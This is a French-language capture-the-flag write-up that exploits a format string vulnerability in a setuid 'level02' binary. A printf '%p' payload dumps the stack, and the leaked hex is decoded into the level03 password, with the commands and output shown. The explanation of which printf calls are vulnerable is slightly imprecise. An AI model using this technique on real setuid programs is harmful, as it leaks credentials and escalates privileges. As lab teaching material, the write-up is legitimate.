## Comportement
- J'ai des droits `level02` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02*`
En exécutant le binaire (`./level02`), on observe:
- qu'il attend un username de notre part.
- qu'il attend ensuite un mot de passe peu importe le username.
- qu'il ne segfault pas meme si l'username est tres long.
    ```shell
    ===== [ Secure Access System v1.0 ] =====
    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: ufuf
    --[ Password: ii
    *****************************************
    ufuf does not have access!
    ```


## Analyse
En analysant le binaire (`gdb ./level02`) on observe:
- Que le mot de passe que l'on doit fournir est en realite le flag que l'on cherche. Il est stocke dans une variable sur la stack :
    ```shell
    0x0000000000400898 <+132>:	mov    $0x400bb0,%edx # "r"
    0x000000000040089d <+137>:	mov    $0x400bb2,%eax # "/home/users/level03/.pass"
    0x00000000004008a2 <+142>:	mov    %rdx,%rsi
    0x00000000004008a5 <+145>:	mov    %rax,%rdi
    0x00000000004008a8 <+148>:	callq  0x400700 <fopen@plt> # fopen("/home/users/level03/.pass", "r")
    ```
- - Utilisation de `printf()`. Peut etre sujet a faille si mal utilise : par exemple `printf("hello")` est vulnerable alors que `print("%s", "hello")` ne l'est pas. La raison : dans la premiere version, un utilisateur peut y inscrire ce qui sera interprete par printf comme des instructions (`%s`) et il ira chercher dans la stack un parametre qui n'existe pas et nous donnera un beau segfault. C'est un Format String Attack. Dans notre cas, meme pas besoin de segfault, on va directement imprimer la stack a l'ecran et donc le mot de passe. Bingo Bounga.


## Résolution
- On imprime la stack avec `%p`. On peut distinguer, apres les adresses nulles `(nil)`, une sucession d'adresses en memoire qui pourrait correspondre a une variable, soit : `0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d`
```shell
python -c 'print "%p "*30' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe3d0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe5c8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```
- Il ne reste plus maintenant qu'a :
    - supprimer les `0x`
    - convertir en ASCII
    - inverser l'endian
    ```shell
    echo -n "4868373452506e7551397361354a414558674e5743717a377358476e68354a354d394b6650673348" | xxd -r -p
    ```
- Il ne reste plus qu'à passer au level03 (`su level03`) en renseignant ce password.
